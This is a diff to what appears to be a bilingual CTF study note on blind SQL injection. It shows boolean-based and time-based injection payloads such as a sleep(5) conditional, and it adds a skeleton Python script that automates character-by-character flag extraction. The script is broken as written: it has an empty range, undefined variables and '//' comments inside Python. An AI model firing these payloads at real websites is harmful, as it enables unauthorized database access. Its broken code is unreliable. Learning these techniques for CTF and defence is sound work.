@@ -70,15 +70,32 @@ When we cannot show results what we want, we still can find whether it exists or
 **Boolean based**  
 ```sql
 length(str)
-substr(str,pos,len)   // start index is 1 !!, mid(str,pos,len)
-ascii(str)    // we will get decimal,ord()
+substr(str,pos,len)   // start index from 1
+mid(str,pos,len)
+ascii(str)    // we will get decimal, ord()
 if(a,b,c)   // if a is true, return b, otherwise return c
 id=1' and ascii(substr((select database()),1,1))>65--+
 ```
-Blind-based會花非常多時間，所以可以自己寫script來代替手注! (有時間會把盲注腳本搞出來上傳><  
 **Time based**  
 ```sql
 id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if 第一個字非s以後的字母 則延遲5秒
+```
+Blind-based會花非常多時間，所以可以自己寫script來代替手注!  
+```python
+#!/usr/bin/env python3
+import re
+import requests
+from string import digits, ascii_uppercase, ascii_lowercase
+
+target = url
+flag = ''
+wordlist = digits + ascii_uppercase + ascii_lowercase         // 透過上面引用，可以將數字，字母一次性加入payload
+for i in range( , ):    // range of flag length
+   d = {'key':'value','key2':'substr(flag,{},1)'.format(i)}        // 盲注，有時需要繞過waf
+   response = requests.post(target,data=d)
+   flag += re.search(pattern_reg, specific_txt)
+   print flag
+print '[+] flag: pwnch{{}}'.format(flag)
 ```
 
 ### Error based
